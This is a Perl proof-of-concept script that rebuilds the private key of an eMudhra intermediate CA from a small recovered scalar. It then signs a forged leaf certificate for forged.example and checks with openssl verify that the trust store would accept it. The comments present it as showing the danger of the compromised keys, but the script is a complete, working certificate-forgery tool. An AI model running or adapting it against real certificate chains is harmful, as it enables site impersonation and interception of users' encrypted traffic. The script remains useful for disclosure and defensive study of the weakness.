#!/usr/bin/env perl
# forge a leaf certificate signed by a compromised eMudhra intermediate
#
# check.pl recovers the small scalar; this rebuilds the private key from it and
# uses it to sign a new certificate (CN=forged.example) as if it were the CA.
# openssl verify against the chain then shows the trust store would accept a
# spoofed site - which is what makes these compromised keys dangerous in practice
# https://web.archive.org/web/20261020211414/https://emudhra.we-have-a-problem.com/

use strict;
use warnings;
use MIME::Base64 qw(encode_base64);
use File::Temp qw(tempdir);
use FindBin;
use lib $FindBin::Bin;

# color comes from Color.pm next to this script; without it, output is plain text
BEGIN {
    unless (eval { require Color; Color->import; 1 }) {
        no warnings 'once';
        *paint = sub { $_[1] };
    }
}

my ($file, $which) = @ARGV;
die "usage: $0 cert_or_chain.pem [N]\n" unless $file && -f $file;
$which //= 2; # chains are leaf first, so the intermediate is usually second

# ---- minimal DER helpers (same as prove.pl) ----
sub der_len {
    my $n = shift;
    return pack('C', $n) if $n < 0x80;
    my $b = '';
    while ($n) { $b = pack('C', $n & 0xff) . $b; $n >>= 8 }
    return pack('C', 0x80 | length $b) . $b;
}
sub tlv { my ($tag, $v) = @_; pack('C', $tag) . der_len(length $v) . $v }

# per-curve: coordinate bytes, digest, named-curve OID (DER contents), openssl curve name
my %curve = (
    'P-384' => { len => 48, md => 'sha384', oid => "\x2b\x81\x04\x00\x22", ec => 'secp384r1' },
    'P-256' => { len => 32, md => 'sha256', oid => "\x2a\x86\x48\xce\x3d\x03\x01\x07", ec => 'prime256v1' },
);

# SEC1 "EC PRIVATE KEY" PEM from a scalar (RFC 5915)
sub key_pem {
    my ($scalar, $cv) = @_;
    my $raw  = pack 'H*', sprintf('%0*x', 2 * $cv->{len}, $scalar);
    my $der  = tlv(0x30,
                   tlv(0x02, "\x01")                  # version 1
                 . tlv(0x04, $raw)                    # privateKey (scalar)
                 . tlv(0xa0, tlv(0x06, $cv->{oid}))); # [0] named curve
    my $b64 = encode_base64($der, '');
    $b64 =~ s/(.{64})/$1\n/g;
    $b64 =~ s/\n?$/\n/;
    return "-----BEGIN EC PRIVATE KEY-----\n$b64-----END EC PRIVATE KEY-----\n";
}

sub write_file { my ($path, $data) = @_; open my $fh, '>', $path or die "$path: $!\n"; print $fh $data; close $fh }
sub slurp      { my ($path) = @_; open my $fh, '<', $path or return ''; local $/; <$fh> }

my $certs = slurp($file);
my @all   = $certs =~ /(-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----)/gs;
die "no certificates in $file\n" unless @all;
$which = 0 + $which;
die "$file has only ", scalar(@all), " certificate(s)\n" if $which < 1 || $which > @all;

my $ca_pem = $all[$which - 1];
my $dir    = tempdir(CLEANUP => 0); # keep artifacts so you can inspect them: printed at the end
write_file("$dir/ca.pem", $ca_pem);

# recover the scalar with check.pl, and read back the curve and scalar
my $out = qx($^X "$FindBin::Bin/check.pl" "$dir/ca.pem" 2>/dev/null);
unless ($out =~ /(P-\d+)\s+COMPROMISED\s+private scalar = (\d+)/) {
    my ($subj) = qx(openssl x509 -in "$dir/ca.pem" -noout -subject -nameopt multiline 2>/dev/null) =~ /commonName\s*=\s*(.+)/;
    die "cert [$which] (", $subj // '?', ") has no recoverable small scalar\n";
}
my ($cname, $scalar) = ($1, $2);
my $cv = $curve{$cname};

my ($ca_cn) = qx(openssl x509 -in "$dir/ca.pem" -noout -subject -nameopt multiline 2>/dev/null) =~ /commonName\s*=\s*(.+)/;
$ca_cn //= '?';
print "forging a leaf under ", paint('cyan', $ca_cn), " ($cname, scalar $scalar)\n";

# rebuild the CA's private key from the recovered scalar, confirm it matches
write_file("$dir/ca.key", key_pem($scalar, $cv));
my $pub_from_key  = qx(openssl pkey -in "$dir/ca.key" -pubout 2>/dev/null);
my $pub_from_cert = qx(openssl x509 -in "$dir/ca.pem" -noout -pubkey 2>/dev/null);
die "rebuilt key does not match the certificate's public key\n"
    unless defined $pub_from_key && $pub_from_key eq $pub_from_cert;

# make a leaf CSR for forged.example, then sign it with the rebuilt CA key
my $host = 'forged.example';
write_file("$dir/leaf.key", qx(openssl ecparam -name $cv->{ec} -genkey 2>/dev/null)); # fresh throwaway leaf key
my @req = ('openssl','req','-new','-key',"$dir/leaf.key","-subj","/CN=$host","-out","$dir/leaf.csr");
system(@req) == 0 or die "openssl req failed\n";
write_file("$dir/leaf.ext", "subjectAltName=DNS:$host\n");

my @sign = (qw(openssl x509 -req), "-in", "$dir/leaf.csr",
            '-CA',   "$dir/ca.pem",  '-CAkey', "$dir/ca.key",
            qw(-set_serial 1 -days 365), "-" . $cv->{md},
            '-extfile', "$dir/leaf.ext",
            '-out',     "$dir/forged_leaf.pem");
system(@sign) == 0 or die "openssl x509 (forging the leaf) failed\n";

# verify: use every other cert in this file as untrusted intermediates / roots.
# chains here are leaf, intermediate(s), root(s); excluding the CA we forged under
my @rest = grep { $_ ne $ca_pem } @all;
write_file("$dir/untrusted.pem", join('', map { "$_\n" } @rest));

print "\n";
print "  forged:   ", paint('cyan', "CN=$host"), " signed by $ca_cn\n";
my $v = qx(openssl verify -show_chain -untrusted "$dir/untrusted.pem" "$dir/forged_leaf.pem" 2>&1);
if ($v =~ /forged_leaf\.pem: OK/) {
    print "  verify:   ", paint('bold green', 'OK'), "  (the trust store would accept this spoof)\n";
} else {
    for my $l (split /\n/, $v) { chomp $l; next unless length $l; print "  ", paint($l =~ /: OK/ ? 'green' : 'bold red', "$l"), "\n" }
    exit 1;
}

print "\nforged leaf and rebuilt CA key kept in: ", paint('cyan', $dir), "\n";
exit 0;
